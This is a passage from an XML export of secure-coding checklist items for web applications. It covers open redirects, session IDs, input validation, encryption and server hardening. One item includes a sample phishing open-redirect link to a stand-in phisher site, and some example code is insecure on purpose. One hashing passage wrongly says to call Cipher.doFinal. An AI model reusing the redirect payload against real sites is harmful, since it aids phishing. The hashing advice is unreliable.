&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to make sure that mapping values are used for redirects and forwards:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Examine redirects and forwards.&lt;/strong&gt; Look for code that handles parameters. Verify that this code does not accept fully qualified URLs as input for calculating destinations of redirects or forwards. If code uses parameters to calculate destinations
 of redirects or forwards, verify that only short-hand keywords defined by the application are accepted as input to map to valid and authorized destinations.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Perform the following actions to calculate destinations of redirects and forwards based on mapping values:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify redirects and forwards.&lt;/strong&gt; Review code to find all redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Enumerate destinations.&lt;/strong&gt; Make a list of all destinations pointed to by redirects and forwards.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Define mapping values.&lt;/strong&gt; Define mapping values for all destinations used by redirects and forwards. A mapping value is a short identifying string that symbolically represents a resource.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Rewrite redirects and forwards.&lt;/strong&gt; Rewrite redirects and forwards to use mapping values as input to calculate the final destinations of redirects or forwards.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;Consider an on-line banking application that has an insecure redirect:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=[destination]&lt;/pre&gt;
&lt;p&gt;A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;p&gt;When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The
 user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now
 has the user's online banking information.&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The simplest solution&amp;nbsp;is to get rid of the redirect altogether, but if it is necessary for application design, then mapping values may be used to mitigate this vulnerability. For example, if redirect.asp is used by the application to redirect to balance.asp,
 a mapping value called &amp;quot;balance&amp;quot; may be created to signify balance.asp. The page redirect.asp should then be rewritten to accept mapping values as input, instead of urls. The following url should then redirect to balance.asp:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?map=balance&lt;/pre&gt;
&lt;p&gt;However, the following malicious hyperlink will no longer work, because supplied input will not match any mapping value defined in the application:&lt;/p&gt;
&lt;pre&gt;http://www.onlinebank.com/redirect.asp?url=www.phisher.com&lt;/pre&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about unvalidated redirects and forwards, please see &lt;a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards"&gt;
http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:83896e9e-a4cd-434c-980a-276c660984da"&gt;Use Mapping Values When Redirecting on User Input&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:c2f99851-794e-4cda-a1ee-71447d93bfc8"&gt;Don't Use Redirects or Forwards if Possible&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33"&gt;Validate Destinations of Redirects and Forwards&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7"&gt;URL Redirection Attack&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608"&gt;How to Test for URL Redirection Bugs&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178"&gt;Phishing Attack&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>8d95360c-f16f-4192-8a41-59afe25c3278</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>JSESSIONIDs are Stored in the URL When Cookies are Disabled</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Session Management</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Verify that &lt;strong&gt;JSESSIONID&lt;/strong&gt;s are stored inside the URL when cookies are disabled by the browser.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;JSESSIONID&lt;/strong&gt;s are the identifiers that match a client to a session. The use of truly random
&lt;strong&gt;JSESSIONID&lt;/strong&gt; makes it difficult for an attacker to hijack the session and impersonate a user.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Session management encompasses the techniques employed by web applications to transparently authorize a user for every HTTP request without requiring the user to repeatedly login. J2EE session management uses a session-specific session identifier,
&lt;strong&gt;JSESSIONID&lt;/strong&gt;, which is created at the start of each session. If your application needs to keep track of user sessions, use the following steps to ensure that your application tracks sessions securely:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure your application verifies the use of cookies. &lt;/strong&gt;Check if your application verifies whether users' browsers have cookies enabled. If cookies are enabled, verify that sessions are handled via the use of cookies.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure your application can use sessions if cookies are disabled. &lt;/strong&gt;
If cookies are disabled, verify if your application uses &lt;strong&gt;HttpServletResponse.encodeURL&lt;/strong&gt; to store the
&lt;strong&gt;JSESSIONIDs&lt;/strong&gt; in the URL. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String url = request.getRequestURL().toString();&lt;br&gt;&lt;strong&gt;       url = response.encodeURL(url);&lt;br&gt;&lt;/strong&gt;             response.sendRedirect(url);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that JSESSIONIDs are stripped out from the&amp;nbsp;URL upon visiting external links.
&lt;/strong&gt;Verify that your application sanitizes its URL when visiting external sites. Ensure that all
&lt;strong&gt;JSESSIONID&lt;/strong&gt;s are removed when exiting your application.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code shows the login interaction between the application and the user. Once the user requests the initial page, the application forwards them to the login screen. Upon verifying the credentials, the application loads the main application interface.
 Unfortunately, the application does not check whether the client supports cookies; therefore causing a broken access control as the valid user may not be able to access the application.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;%-- Filename: /myapp/index.jsp --%&amp;gt;&lt;br&gt;&amp;lt;%-- The application fails to check whether the client supports cookies --%&amp;gt;&lt;br&gt;&amp;lt;jsp:forward page=&amp;quot;/myapp/login.jsp&amp;quot; /&amp;gt;  &lt;br&gt;&amp;lt;%-- Filename: /myapp/login.jsp --%&amp;gt;&lt;br&gt;&amp;lt;html&amp;gt;&lt;br&gt;  &amp;lt;head&amp;gt;&lt;br&gt;    &amp;lt;title&amp;gt;::login&amp;lt;/title&amp;gt;&lt;br&gt;  &amp;lt;/head&amp;gt;&lt;br&gt;  &amp;lt;body&amp;gt;&lt;br&gt;    &amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;https://login.example.com/myapp/auth&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;user&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;pass&amp;quot; size=&amp;quot;20&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;br&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&lt;br&gt;    &amp;lt;/form&amp;gt;&lt;br&gt;  &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;&lt;br&gt;  /*  Filename: /myapp/auth  */import java.io.*;&lt;br&gt;                               import java.util.*;&lt;br&gt;                               import javax.servlet.*;&lt;br&gt;                               import javax.servlet.http.*;&lt;br&gt; public final class Auth extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request,&lt;br&gt;                        HttpServletResponse response)&lt;br&gt; throws ServletException,&lt;br&gt; IOException&lt;br&gt;      {&lt;br&gt;            HttpSession session = request.getSession(true);&lt;br&gt;            String redirectURL = &amp;quot;/myapp/main&amp;quot;;&lt;br&gt;            //The application fails to check whether the client supports cookies&lt;br&gt;            ...&lt;br&gt;            response.sendRedirect(redirectURL);&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:169A99D8-459F-42D7-8E3D-F6B07D691733"&gt;Guideline: Store JSESSIONIDs in the URL When Cookies Are Disabled (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>93edf997-ee9c-4290-9041-2673fb656781</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Free Form Input is Sanitized to Protect Against Malicious Data</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application validates all forms of input&amp;nbsp;and cleans malicious data either by&amp;nbsp;rejecting or sanitizing it.&lt;/p&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Do not trust input. An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your application's vulnerabilities. Check for known good data, and constrain input by validating it for
 type, length, format, and range.&lt;/p&gt;
&lt;p&gt;For Web form applications that obtain input through server controls, use the ASP.NET validator controls, such as the
&lt;strong&gt;RegularExpressionValidator&lt;/strong&gt;, &lt;strong&gt;RangeValidator&lt;/strong&gt;, and
&lt;strong&gt;CustomValidator&lt;/strong&gt;, to validate and constrain input. Check all numeric fields for type and range. If you are not using server controls, you can use regular expressions and the
&lt;strong&gt;Regex&lt;/strong&gt; class, and you can validate numeric ranges by converting the input value to an integer or double and then performing a range check.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>95b03908-7345-47fc-bec1-5a40e8ad1b94</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Sensitive Data is Protected Over the Network</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Sensitive Data</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that encryption is used to protect all&amp;nbsp;sensitive data transmitted over the network.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Because network traffic can be easily eavesdropped or modified by attackers, passing sensitive data over the network is prone to a host of attacks, including data theft and data manipulation.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;When an application transmits sensitive data over the network, it is necessary to ensure that it is encrypted to protect the data from being&amp;nbsp;read or modified in transit. To ensure this, follow the steps outlined below:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify sensitive information. &lt;/strong&gt;Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued
 ID numbers, credit card and other financial information, passwords and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application,
 to identify sensitive data. Sensitive data can be defined as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others.
&lt;/li&gt;&lt;li&gt;Information that a user provides that they would not want shared with other users of the application.
&lt;/li&gt;&lt;li&gt;Information that comes from an external trusted source that is not designed to be shared with users&lt;/li&gt;&lt;/ul&gt;
&lt;strong&gt;&lt;/strong&gt;&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that sensitive data is securely transmitted. &lt;/strong&gt;Ensure that your application transmits sensitive data in a secured fashion.&amp;nbsp;Verify that&amp;nbsp;your application&amp;nbsp;encrypts the data using&amp;nbsp;encryption or hashing and encrypts the communication link:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypting application data:&lt;/strong&gt; Your application securely transforms its application data before transmitting it over the network:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Hashing: &lt;/strong&gt;Hashing is a one-way mechanism for protecting sensitive data in a non-retrievable way. If your application uses hashing as means for protecting sensitive data, verify that the following pieces are in place:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Salt&lt;/strong&gt;: Your application generates its salt using the SecureRandom class.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Function&lt;/strong&gt;: Your application uses SHA-256, SHA-384 or SHA-512 as its hash function.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Invocation&lt;/strong&gt;: Your application invokes the &lt;strong&gt;Cipher.doFinal&lt;/strong&gt; method to perform the hashing procedure.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Clean-up&lt;/strong&gt;: Your application securely cleans-up all instances of the sensitive data after the hashing procedure has been completed. Consult the
&lt;a href="?#ruledisplay:E9F37DE4-E6E7-4D65-A3E1-C2292372AAF0"&gt;Sensitive Data is Cleared from Memory when No Longer Used&lt;/a&gt; checklist for more details.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encryption:&lt;/strong&gt; Encryption is a mechanism for protecting sensitive data in a retrievable way. If your application uses encryption as means for protecting sensitive data, verify that the following pieces are in place:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Encryption Key&lt;/strong&gt;: Your application's encryption keys are securely stored inside your application's key store. Consult the
&lt;a href="?#ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0"&gt;Use a Secure Key Storage Location&lt;/a&gt; guideline for more details.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Function&lt;/strong&gt;: Your application uses AES, 3DES, or any other strong symmetric encryption function.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Invocation&lt;/strong&gt;: Your application invokes the &lt;strong&gt;Cipher.init&lt;/strong&gt; and
&lt;strong&gt;Cipher.doFinal&lt;/strong&gt; methods to perform the encryption procedure. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;Clean-up&lt;/strong&gt;: Your application securely cleans-up all instances of the sensitive data and their encryption keys after the encryption procedure has been completed. Consult the
&lt;a href="?#ruledisplay:E9F37DE4-E6E7-4D65-A3E1-C2292372AAF0"&gt;Sensitive Data is Cleared from Memory when No Longer Used&lt;/a&gt; checklist for more details.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Encrypting the communication links:&lt;/strong&gt; Using the &lt;a href="?#ruledisplay:AFC86927-1116-4207-B604-55FE690C298B"&gt;
Communication Links are Encrypted&lt;/a&gt; checklist, check if your application's communication links are properly secured.&lt;/p&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code authenticates a user based on username and password. The supplied credentials are compared to the credentials stored in the backend database. Unfortunately, the credentials are transmitted in plaintext and could be stolen if the network
 is compromised. &lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;public boolean validateUser(String user, char[] pass)&lt;br&gt;{&lt;br&gt;      // Query the credential store with the provided credentials&lt;br&gt;      ...&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:024B6044-7C89-436C-8111-1B6FAE7298AC"&gt;Guideline: Protect Sensitive Data Over the Network (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>961e775c-57fa-4074-b60d-41fd80ec2646</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Administrative shares (C$ and Admin$) are removed if they are not required</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that access to Administrative shares (C$ and Admin$) are removed if they are not required by the Microsoft Management Server (SMS) and Microsoft Operations Manager (MOM).&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;If you do not allow remote administration of your server, remove unused administrative shares, for example
&lt;strong&gt;C$&lt;/strong&gt; and &lt;strong&gt;Admin$&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Some applications may require administrative shares. Examples include Microsoft Systems Management Server (SMS) and Microsoft Operations Manager (MOM). For more information, see Microsoft Knowledge Base article 318751, &amp;quot;How
 To: Remove Administrative Shares in Windows&amp;nbsp;2000 or Windows&amp;nbsp;NT&amp;nbsp;4.0.&amp;quot;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>982be6a3-75f4-40f1-99b5-87aa9cd7683a</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Unused ports are blocked by default.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that unused ports are blocked by default when configuring your network firewall.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9b616a62-afc1-4f8c-9640-525a5e2d3fd5</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Debug compiles are turned off. </title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that debug compiles are turned off&amp;nbsp;in the machine.config file on production servers.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;You can control whether or not the compiler produces debug builds that include debug symbols by using the&lt;strong&gt; &amp;lt;compilation&amp;gt;&lt;/strong&gt; element. To turn off debug compiles, set
&lt;strong&gt;debug=&amp;quot;false&amp;quot;&lt;/strong&gt; as shown below:&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;compilation debug=&amp;quot;false&amp;quot; explicit=&amp;quot;true&amp;quot; defaultLanguage=&amp;quot;vb&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9be158d9-e6c2-434d-9d78-ef615b9219cb</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>SAM is secured (HKLM\System\CurrentControlSet\Control\LSA\NoLMHash). This applies only to standalone servers.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the Security Account Manager (SAM) database in the registry is secured for standalone servers.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Stand-alone servers store account names and one-way (non-reversible) password hashes (LMHash) in the local Security Account Manager (SAM) database. The SAM is part of the registry. Typically, only members of the Administrators group have access to the account
 information.&lt;/p&gt;
&lt;p&gt;Although the passwords are not actually stored in the SAM and password hashes are not reversible, if an attacker obtains a copy of the SAM database, the attacker can use brute force password techniques to obtain valid user names and passwords.&lt;/p&gt;
&lt;p&gt;Restrict LMHash storage in the SAM by creating the key (not value) &lt;strong&gt;NoLMHash&lt;/strong&gt; in the registry as follows:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HKLM\System\CurrentControlSet\Control\LSA\NoLMHash&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information, see Microsoft Knowledge Base article 299656, &amp;quot;New Registry Key to Remove LM Hashes from Active Directory and Security Account Manager.&amp;quot;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>9ce8b183-9ade-4eb4-bd02-97b0e5b4f961</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Output that Contains Untrusted Data is Encoded with HtmlEncode or UrlEncode</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure&amp;nbsp;that any untrusted input used in the output stream is first encoded with
&lt;strong&gt;HtmlEncode&lt;/strong&gt; or &lt;strong&gt;UrlEncode&lt;/strong&gt;.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Echoing input directly back to the user makes your application vulnerable to cross-site scripting attacks.
&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to check for this problem:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Look for user supplied input inside HTML tag. &lt;/strong&gt;Check for the existence of user supplied input inside html tags your application generates. For instance &amp;lt;A href='somelink'&amp;gt;USERINPUT&amp;lt;/a&amp;gt;&amp;nbsp;&lt;br&gt;
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Look for user supplied input elsewhere in your application output. &lt;/strong&gt;
Check for existing user supplied input in the following locations: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In the HTML tags themselves. For instance, &amp;lt;A href='USERINPUT'&amp;gt; &lt;/li&gt;&lt;li&gt;In database tables that are later used as page content. For instance, you may find unencoded user input in a user profile stored in your database.
&lt;/li&gt;&lt;li&gt;In files that are later used as page content. For instance, you may find unencoded user input in a local configuration file.&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify all&amp;nbsp;user&amp;nbsp;input&amp;nbsp;input is encoded. &lt;/strong&gt;The untrusted data should be encoded using
&lt;strong&gt;HtmlEncode&lt;/strong&gt; or &lt;strong&gt;UrlEncode&lt;/strong&gt;. Make sure that you encode data at the last possible opportunity before the data is returned to the client. If you encode any earlier, you may not know the exact context that the data will be used in
 and&amp;nbsp;the corresponding&amp;nbsp;format you need to encode into. Early encoding of some data can also&amp;nbsp;result in double encoding problems.
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
